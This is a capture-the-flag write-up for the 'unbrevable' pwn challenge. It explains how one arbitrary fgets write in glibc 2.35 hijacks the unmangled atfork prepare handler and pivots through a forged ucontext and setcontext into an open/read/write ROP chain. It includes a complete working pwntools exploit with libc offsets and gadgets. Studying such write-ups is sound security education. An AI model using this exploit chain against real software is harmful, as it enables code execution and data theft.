# unbrevable

`unbrevable` is a 474-point pwn challenge from TFC CTF 2026. A hardened netcat
binary gives you one libc leak and one arbitrary `fgets` write (to any address,
any size), then calls `fork()` — which a seccomp filter kills with `SIGSYS` (no
`clone`). Key idea: hijack glibc's `fork` atfork prepare handler (a raw,
un-mangled function pointer) and pivot through a forged `ucontext` +
`setcontext` ROP to `open`/`read`/`write` the flag before the `clone` syscall
fires.

## Recon

The attachment is `unbrevable.zip`. Unpacking gives `vuln_patched`,
`libc-2.35.so`, `ld-2.35.so`, a `Dockerfile` and a local `flag`. The Dockerfile
runs `vuln_patched` under `socat` on port 1337 with the flag at `/app/flag`,
dropped privileges and `cap_drop: ALL`.

```
$ file vuln_patched
vuln_patched: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
interpreter ./ld-2.35.so, not stripped

$ checksec vuln_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    .
Stripped:   No
```

Running it prints one address and then waits for input:

```
$ ./vuln_patched
0x7642fe0815f0
```

Reversing the (unstripped) binary gives the flow:

```
init()            # alarm + setvbuf setup
setup_seccomp()   # libseccomp filter (see below)
printf("%p\n", setvbuf)      # the libc leak
scanf("%zu %zu", &a, &b)      # target address a, size b
fgets((void*)a, b, stdin)     # one arbitrary write
fork()                         # -> clone -> SIGSYS (kill)
```

The seccomp filter (default `SCMP_ACT_KILL_PROCESS`, allowlist):

```
open(2)          openat(0x101)     read(0)      write(1)
rt_sigprocmask(14)  rt_sigaction(15)  exit(60)
exit_group(0xe7)    execveat(0x142)
```

There is **no `clone`**, so the `fork()` at the end of `main` dies with `SIGSYS`
— but not before `fork()` runs its atfork **prepare** handlers. That is the
window the exploit uses.

## Analysis

Observation: `fgets` gives a single arbitrary write (up to `SIZE_MAX` bytes) to
any address, and the libc base is known from the `setvbuf` leak. There is no PIE
or stack leak, so a direct ROP on the program stack is out.

Hypothesis: overwrite glibc's fork-handler globals so the `fork()` call executes
one attacker-chosen function pointer. The atfork `prepare_handler` is a raw
pointer (`call rax` in `__run_fork_handlers`), not protected by `PTR_MANGLE`
(unlike the exit-handler lists), and it is invoked with `rdi = __fork_handlers`
(the count).

Confirmation (glibc 2.35 `__run_fork_handlers`, disassembled):

```
eaf17:  mov    rbp, QWORD PTR [rip+0x136bc2]   # 0x221ae0  __fork_handlers (count)
eaf1e:  mov    rdi, rbp                          # rdi = count  (at every call)
eaf30:  mov    rax, rbp
eaf33:  shl    rax, 0x5                          # handler stride = 32 bytes
eaf37:  add    rax, QWORD PTR [rip+0x136bb2]   # 0x221af0  __fork_handler_pool (base)
eaf3e:  mov    rax, QWORD PTR [rax]              # pool[i].prepare_handler
eaf41:  test   rax, rax
eaf46:  call   rax                               # <-- raw indirect call, rdi = count
```

So:

1. Set `__fork_handlers` (count) = the address of a forged `ucontext_t` we put in
   our payload — this makes `rdi` point at it at the `call rax`.
2. Set `__fork_handler_pool` (base) so that `pool[count-1]` resolves to a fake
   handler struct whose first pointer is `setcontext+4`.
3. `fork()` -> `__run_fork_handlers(atfork_run_prepare)` -> `call setcontext(uc)`
   with `rdi = uc`. `setcontext` restores registers from the forged ucontext,
   including `rsp = [uc+0xa0]` and `rip = [uc+0xa8]`, pivoting into our ROP.

Techniques:

- **Arbitrary write** (`fgets` to an attacker-chosen address/size).
- **atfork-handler overwrite** — hijack `__fork_handlers`/`__fork_handler_pool`;
  the prepare handler is a plain function pointer (no `PTR_MANGLE`).
- **Forged-ucontext `setcontext` pivot** — fake `ucontext_t` with
  `rsp`/`rip`/`rdi`/`rsi`/`rdx` fields, jumped to via `setcontext`.
- **seccomp-allowlisted ROP** — `open`/`read`/`write` only, and `_exit`
  (`exit_group`) to terminate cleanly.

## Exploit

Offsets in the provided `libc-2.35.so`, relative to the leaked base:

```
setvbuf              0x815f0
__fork_handlers      0x221ae0   # count
__fork_handler_pool  0x221af0   # base
setcontext           0x539e0    # use +4 -> 0x539e4 (skip endbr64)
pop rdi; ret         0x2a3e5
pop rsi; ret         0x2be51
pop rdx; pop rbx; ret 0x904a9
open                 0x1144e0
read                 0x1147d0
write                0x114870
_exit                0xeac00
xchg edi,eax; ret    0x164eec   # capture the open() fd remotely
```

**1. Leak the libc base.**

```
$ ncat --ssl <deployment>.challs.ctf.thefewchosen.com 1337
0x7f6f52b135f0
```

`libc_base = leak - 0x815f0`.

**2. Build the payload: overwrite the fork handlers + forge a ucontext + ROP.**

The payload is one contiguous `fgets` write starting at `libc_base + 0x221ae0`:

```
payload[0x00] = count            # __fork_handlers = fake_uc addr  (rdi for the call)
payload[0x10] = base_val         # __fork_handler_pool = fake_handler - ((count-1)<<5)
payload[0x100] = setcontext, 0, 0, 0   # fake handler struct (prepare=setcontext+4)
payload[0x300] = fake ucontext_t       # rdi/rsi/rdx/rsp/rip fields
payload[0x800] = ROP chain
payload[0x900] = flag buffer
payload[0xa00] = "flag\x00"
```

The forged ucontext registers (x86_64 sigcontext offsets inside `ucontext_t`):

```
uc+0x68 = flag_addr    # -> rdi  (open path)
uc+0x70 = 0            # -> rsi  (O_RDONLY)
uc+0x88 = 0            # -> rdx
uc+0xa0 = chain        # -> rsp  (ROP stack)
uc+0xa8 = open_        # -> rip  (via push rcx; ret)
uc+0xe0 = fake_uc+0x200  # fpregs pointer (setcontext writes FPU state here)
```

The ROP chain (local fd = 3):

```python
rop = b''.join([
    p64(pop_rdi), p64(3),           # fd
    p64(pop_rsi), p64(buf),
    p64(pop_rdx_rbx), p64(0x100), p64(0),
    p64(read_),
    p64(pop_rdi), p64(1),           # stdout
    p64(pop_rsi), p64(buf),
    p64(pop_rdx_rbx), p64(0x100), p64(0),
    p64(write_),
    p64(exit_),
])
```

Full payload builder:

```python
def build_payload(libc_base, flag_path=b'flag\x00'):
    start = libc_base + 0x221ae0
    off_h=0x100; off_uc=0x300; off_chain=0x800; off_buf=0x900; off_flag=0xa00
    fake_handler = start + off_h
    fake_uc      = start + off_uc
    chain        = start + off_chain
    buf          = start + off_buf
    flag_addr    = start + off_flag
    count    = fake_uc                      # rdi for the prepare call
    base_val = (fake_handler - ((count - 1) << 5)) & 0xffffffffffffffff

    setcontext = libc_base + 0x539e4
    pop_rdi    = libc_base + 0x2a3e5
    pop_rsi    = libc_base + 0x2be51
    pop_rdx_rbx = libc_base + 0x904a9
    open_  = libc_base + 0x1144e0
    read_  = libc_base + 0x1147d0
    write_ = libc_base + 0x114870
    exit_  = libc_base + 0xeac00

    uc = bytearray(0x400)
    def q(off, val): struct.pack_into('<Q', uc, off, val)
    q(0x28,0); q(0x30,0); q(0x48,0); q(0x50,0); q(0x58,0); q(0x60,0)
    q(0x68, flag_addr); q(0x70,0); q(0x78,0); q(0x80,0); q(0x88,0); q(0x98,0)
    q(0xa0, chain); q(0xa8, open_)
    q(0xe0, fake_uc + 0x200)

    rop = b''.join([
        p64(pop_rdi), p64(3),
        p64(pop_rsi), p64(buf),
        p64(pop_rdx_rbx), p64(0x100), p64(0),
        p64(read_),
        p64(pop_rdi), p64(1),
        p64(pop_rsi), p64(buf),
        p64(pop_rdx_rbx), p64(0x100), p64(0),
        p64(write_),
        p64(exit_),
    ])
    handler = b''.join([p64(setcontext), p64(0), p64(0), p64(0)])

    payload = bytearray(off_flag + len(flag_path) + 0x10)
    struct.pack_into('<Q', payload, 0x00, count)
    struct.pack_into('<Q', payload, 0x10, base_val)
    payload[off_h:off_h+len(handler)] = handler
    payload[off_uc:off_uc+len(uc)] = uc
    payload[off_chain:off_chain+len(rop)] = rop
    payload[off_flag:off_flag+len(flag_path)] = flag_path
    return start, bytes(payload)
```

**3. Send the write target + size, then the payload.**

`scanf` reads `a` and `b` (target address and size), then `fgets` performs the
write. The payload must contain no `0x0a` bytes (`fgets` stops at a newline); if
it does, retry on a fresh connection until the addresses happen to avoid `0x0a`.

```
$ ncat --ssl <deployment>.challs.ctf.thefewchosen.com 1337
0x7f6f52b135f0
140149783861984 1040        # a = 0x221ae0+base, b = len(payload)+0x10
<binary payload>

```

**4. `fork()` pivots into the ROP and prints the flag.**

The `fork()` call runs the (overwritten) atfork prepare handler:

```
fork() -> __run_fork_handlers(atfork_run_prepare)
       -> call [fake_handler].prepare_handler      # = setcontext, rdi = fake_uc
       -> setcontext(fake_uc)                      # rsp=chain, rip=open, rdi=flag
       -> open("flag", 0) -> read(3, buf, 0x100) -> write(1, buf, 0x100) -> _exit
```

```
TFCCTF{well_known_technique_brudda}
```

**5. Remote fd fix.**

The local `socat` keeps fd 3 open, so `open()` returns fd 4 remotely (and the
hardcoded `pop rdi, 3` would read fd 3, not the flag fd). Capture the real
return value with a `xchg edi,eax; ret` gadget right after `open`:

```
p64(open_)           # rax = returned fd (4 remotely)
p64(xchg_edi_eax)    # rdi = rax  (libc + 0x164eec)
p64(pop_rsi), p64(buf)
p64(pop_rdx_rbx), p64(0x100), p64(0)
p64(read_)
...
```

## Full chain

Local-tested exploit (`solve_exploit.py`); on the remote, swap the hardcoded
`pop rdi, 3` for the `xchg edi,eax` fix from step 5.

```python
import re, sys, struct
from pwn import *
context.clear(arch='amd64', os='linux')
context.log_level = 'error'

SETVBUF_OFF   = 0x815f0
FORK_HANDLERS = 0x221ae0

def build_payload(libc_base, flag_path=b'flag\x00'):
    start = libc_base + FORK_HANDLERS
    off_h=0x100; off_uc=0x300; off_chain=0x800; off_buf=0x900; off_flag=0xa00
    fake_handler = start + off_h
    fake_uc      = start + off_uc
    chain        = start + off_chain
    buf          = start + off_buf
    flag_addr    = start + off_flag
    count    = fake_uc
    base_val = (fake_handler - ((count - 1) << 5)) & 0xffffffffffffffff
    setcontext = libc_base + 0x539e4
    pop_rdi    = libc_base + 0x2a3e5
    pop_rsi    = libc_base + 0x2be51
    pop_rdx_rbx = libc_base + 0x904a9
    open_  = libc_base + 0x1144e0
    read_  = libc_base + 0x1147d0
    write_ = libc_base + 0x114870
    exit_  = libc_base + 0xeac00

    uc = bytearray(0x400)
    def q(off, val): struct.pack_into('<Q', uc, off, val)
    q(0x28,0); q(0x30,0); q(0x48,0); q(0x50,0); q(0x58,0); q(0x60,0)
    q(0x68, flag_addr); q(0x70,0); q(0x78,0); q(0x80,0); q(0x88,0); q(0x98,0)
    q(0xa0, chain); q(0xa8, open_)
    q(0xe0, fake_uc + 0x200)

    rop = b''.join([
        p64(pop_rdi), p64(3),               # fd (remote: use xchg edi,eax instead)
        p64(pop_rsi), p64(buf),
        p64(pop_rdx_rbx), p64(0x100), p64(0),
        p64(read_),
        p64(pop_rdi), p64(1),
        p64(pop_rsi), p64(buf),
        p64(pop_rdx_rbx), p64(0x100), p64(0),
        p64(write_),
        p64(exit_),
    ])
    handler = b''.join([p64(setcontext), p64(0), p64(0), p64(0)])

    payload = bytearray(off_flag + len(flag_path) + 0x10)
    struct.pack_into('<Q', payload, 0x00, count)
    struct.pack_into('<Q', payload, 0x10, base_val)
    payload[off_h:off_h+len(handler)] = handler
    payload[off_uc:off_uc+len(uc)] = uc
    payload[off_chain:off_chain+len(rop)] = rop
    payload[off_flag:off_flag+len(flag_path)] = flag_path
    return start, bytes(payload)

def main(host, port):
    for attempt in range(40):
        io = remote(host, port, timeout=10)
        leak = int(io.recvline(timeout=5).strip(), 16)
        libc_base = leak - SETVBUF_OFF
        start, payload = build_payload(libc_base)
        if b'\x0a' in payload:
            io.close()
            continue
        io.sendline(f'{start} {len(payload) + 0x10}'.encode())
        io.send(payload + b'\n')
        data = io.recvall(timeout=5)
        m = re.search(rb'TFC(?:CTF)?\{[^}\n]*\}', data)
        if m:
            io.close()
            return m.group(0).decode()
        io.close()
    return None

print(main(sys.argv[1], 1337))
```

## Flag

`TFCCTF{well_known_technique_brudda}`

## Lessons

- `fork()` runs its atfork **prepare** handlers *before* the `clone` syscall, and
  those handler pointers are raw (no `PTR_MANGLE`) — a perfect target when seccomp
  forbids `clone` but the arbitrary write is single-shot.
- A forged `ucontext_t` + `setcontext` turns "call one gadget with `rdi`
  controlled" into a full ROP pivot: `rsp = uc+0xa0`, `rip = uc+0xa8`, and the
  argument registers come from `uc+0x68/0x70/0x88`.
- With `socat`, the daemon already occupies fd 3, so never hardcode the fd the
  exploit's `open()` returns — capture `rax` with `xchg edi,eax; ret`.
